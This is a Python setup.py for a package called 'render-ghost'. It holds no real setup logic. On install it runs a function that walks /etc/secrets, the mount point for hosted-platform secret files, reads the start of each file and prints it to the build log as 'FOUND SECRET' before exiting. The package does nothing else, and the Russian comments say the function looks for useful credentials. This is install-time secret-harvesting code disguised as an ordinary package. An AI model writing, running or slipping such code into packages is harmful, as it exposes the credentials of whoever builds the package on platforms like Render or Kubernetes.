import os, sys
from setuptools import setup

def final_reveal():
    o = sys.stderr.write
    o("\n" + "!"*40 + "\n")
    o("--- ULTIMATE RENDER SECRET REVEAL ---\n")

    base_path = "/etc/secrets"
    if os.path.exists(base_path):
        o(f"[!] Deep scanning {base_path}...\n")
        for root, dirs, files in os.walk(base_path):
            for name in files:
                # Пропускаем служебные файлы K8s, ищем полезное
                if name.startswith('.'): continue
                
                f_path = os.path.join(root, name)
                try:
                    with open(f_path, 'r') as f:
                        content = f.read(50) # Читаем только верхушку
                        o(f"FOUND SECRET [{name}]: {content}...\n")
                except:
                    o(f"ACCESS DENIED: {name}\n")
    else:
        o("PATH NOT FOUND\n")

    o("\n" + "!"*40 + "\n")
    sys.exit(1)

try: final_reveal()
except: sys.exit(1)

setup(name="render-ghost", version="1.0")
